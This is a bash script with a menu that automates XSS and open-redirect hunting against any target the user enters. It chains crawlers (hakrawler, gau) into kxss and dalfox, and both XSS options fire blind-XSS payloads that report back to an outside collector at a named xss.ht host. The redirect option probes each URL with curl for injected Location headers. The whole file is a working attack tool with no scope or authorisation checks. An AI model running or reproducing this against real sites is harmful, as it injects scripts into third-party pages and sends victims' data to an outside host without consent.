#!/bin/bash

function menu {
#colors
red=`tput setaf 1`
reset=`tput sgr0`
	clear
	echo
	echo -e "\t\t\t${red}
|| XSS & Open Redirect ||

${reset}\n"
	echo -e "\t1. XSS 1 hakrawler - wayback"
	echo -e "\t2. XSS 2 hakrawler - depth 5"
	echo -e "\t3. Open Redirect - gau"
	echo -e "\t0. Exit Menu\n\n"
	echo -en "\t\tEnter an Option: "
	read -n 1 option
}


function xss1 {
	clear
	echo -e "Enter the target"
	echo " "
	read target
	hakrawler -url $target -plain -usewayback -wayback | grep $target | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | dalfox pipe -b https://surendirans.xss.ht -o potential-xss1-$target.txt
}

function xss2 {
	clear
	echo -e "Enter the target"
	echo " "
	read target
	hakrawler -url $target -plain -depth 5 | grep $target | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | dalfox pipe -b https://surendirans.xss.ht -o potential-xss2-$target.txt
}

function op {
	clear
	echo -e "Enter the target"
	echo " "
	read target
	export LHOST="http://localhost"; gau $target | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
}


while [ 1 ]
do
	menu
	case $option in
	0)
	break ;;
	1)
	xss1 ;;

	2)
	xss2 ;;
	
	3)
	op ;;
	

	*)
	clear
	echo "Wrong selection";;
	esac
	echo -en "\n\n\t\t\tHit any key to continue"
	read -n 1 line
done
clear
